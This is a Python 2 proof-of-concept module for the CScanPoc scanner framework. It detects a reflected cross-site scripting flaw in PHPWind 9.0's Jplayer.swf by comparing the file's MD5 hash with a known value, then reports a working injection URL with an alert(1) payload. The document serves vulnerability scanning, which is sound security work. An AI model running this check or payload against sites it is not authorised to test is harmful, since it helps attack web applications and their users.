# coding: utf-8
import md5
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0103'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /res/js/dev/util_libs/jPlayer/Jplayer.swf 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-11'  # 漏洞公布时间
    desc = '''
    PHPWind 9.0 /res/js/dev/util_libs/jPlayer/Jplayer.swf 跨站脚本。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2013-017733
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eca4b4d9-abe7-4d77-a6ba-d01f23baf6b1'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "769d053b03973d380da80be5a91c59c2"
            file_path = "/res/js/dev/util_libs/jPlayer/Jplayer.swf"
            verify_url = self.target + file_path
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            md5_value = md5.new(content).hexdigest()

            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;Xss_url={Xss_url}'.format(
                    target=self.target, name=self.vuln.name, Xss_url=verify_url + '?jQuery=alert(1))}catch(e){}//'))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
